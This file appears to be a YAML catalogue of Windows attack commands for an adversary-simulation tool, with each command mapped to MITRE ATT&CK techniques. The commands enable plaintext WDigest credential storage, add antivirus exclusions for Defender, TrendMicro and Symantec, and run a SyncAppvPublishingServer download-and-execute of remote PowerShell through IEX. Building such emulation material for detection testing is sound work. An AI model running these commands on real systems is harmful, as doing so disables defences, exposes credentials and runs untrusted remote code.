
---
commands:
   enable_wdigest:
      remote: false
      id: enable_wdigest
      command: 'cmd.exe /c reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /d 1'
      stealth: low
      mitre:
         - 'Defense Evasion;T1112;Modify Registry'
         - 'Execution;T1059.003;Command and Scripting Interpreter: Windows Command Shell'
      comments: 'Modify WDigest Setting to allow storing of plaintext credentials.'
   defender_reg_exclusion:
      remote: false
      id: defender_reg_exclusion
      command: 'cmd.exe /c REG ADD "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v $CURDIR$ /t REG_DWORD /d 0 /f'
      stealth: low
      mitre:
         - 'Defense Evasion;T1112;Modify Registry'
         - 'Execution;T1059.003;Command and Scripting Interpreter: Windows Command Shell'
      comments: 'Exclude threatsim.exe from Windows Defender.'
   trendmicro_reg_exclusion:
      remote: false
      id: trendmicro_reg_exclusion
      command: 'cmd.exe /c REG ADD "HKLM\SOFTWARE\TrendMicro\UniClient\1700\Scan\Exceptions\0" /v $CURDIR$ /t REG_DWORD /d 1 /f'
      stealth: low
      mitre:
         - 'Defense Evasion;T1112;Modify Registry'
         - 'Execution;T1059.003;Command and Scripting Interpreter: Windows Command Shell'
      comments: 'Exclude threatsim from TrendMicro.'
   symantec_reg_exclusion:
      remote: false
      id: trendmicro_reg_exclusion
      command: 'cmd.exe /c REG ADD "HKLM\\SOFTWARE\Wow6432Node\Symantec\Symantec Endpoint Protection\AV\Exclusions\Domain Controller" && cmd.exe /c REG ADD "HKLM\\SOFTWARE\Wow6432Node\Symantec\Symantec Endpoint Protection\AV\Exclusions\Domain Controller\NoScanDir" /v $CURDIR$ /t REG_DWORD /d 1 /f'
      stealth: low
      mitre:
         - 'Defense Evasion;T1112;Modify Registry'
         - 'Execution;T1059.003;Command and Scripting Interpreter: Windows Command Shell'
      comments: 'Exclude threatsim.exe from TrendMicro.'
   sbpe_SyncAppvPublishingServer_1:
      remote: false
      id: sbpe_SyncAppvPublishingServer_1
      command: 'powershell -Command "SyncAppvPublishingServer.exe \"n;((New-Object Net.WebClient).DownloadString(\"* $RANDOMURL_PS1$\") | IEX\""'
      stealth: low
      mitre:
         - 'Defense Evasion;T1218;Signed Binary Proxy Execution'
         - 'Command and Control;T1105;Ingress Tool Transfer'
         - 'Execution;T1059.001;Command and Scripting Interpreter: PowerShell'
      comments: